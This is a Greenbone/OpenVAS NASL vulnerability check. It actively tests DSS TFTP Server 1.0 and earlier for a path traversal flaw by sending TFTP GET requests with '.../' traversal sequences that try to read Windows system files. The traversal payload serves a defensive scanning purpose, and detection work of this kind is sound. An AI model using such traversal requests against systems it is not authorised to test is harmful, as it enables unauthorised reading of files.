# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105957");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2015-03-04 09:41:51 +0700 (Wed, 04 Mar 2015)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("DSS TFTP Server <= 1.0 Path Traversal Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Remote file access");
  script_dependencies("tftpd_detect.nasl", "global_settings.nasl", "tftpd_backdoor.nasl", "os_detection.nasl");
  script_require_udp_ports("Services/udp/tftp", 69);
  script_mandatory_keys("tftp/detected");
  script_require_keys("Host/runs_windows");
  script_exclude_keys("keys/TARGET_IS_IPV6");

  script_tag(name:"summary", value:"DSS TFTP Server is prone to a path traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted GET request and checks if it can
  download some system files.");

  script_tag(name:"insight", value:"DSS TFTP Server is prone to a path traversal vulnerability that
  enables attacker to download/upload files outside the tftp root directory.");

  script_tag(name:"impact", value:"Unauthenticated attackers can download/upload arbitrary files
  outside the tftp root directory.");

  script_tag(name:"affected", value:"DSS TFTP Server version 1.0 and prior.");

  script_tag(name:"solution", value:"No known solution was made available for at
  least one year since the disclosure of this vulnerability. Likely none will
  be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another
  one.");

  script_xref(name:"URL", value:"http://www.vulnerability-lab.com/get_content.php?id=1440");

  exit(0);
}

if(TARGET_IS_IPV6())
  exit(0);

include("host_details.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");
include("port_service_func.inc");
include("tftp.inc");

port = service_get_port(default: 69, proto: "tftp", ipproto: "udp");

if (!tftp_has_reliable_get(port: port))
  exit(0);

files = traversal_files("windows");

foreach file (keys(files)) {
  res = tftp_get(port: port, path:".../.../.../.../.../.../.../" + files[file]);
  if (!res)
    continue;

  if (egrep(pattern: file, string: res, icase: TRUE)) {
    report = "The " + files[file] + ' file contains:\n' + res;
    security_message(port: port, data: report, proto: "udp");
    exit(0);
  }
}

exit(99);
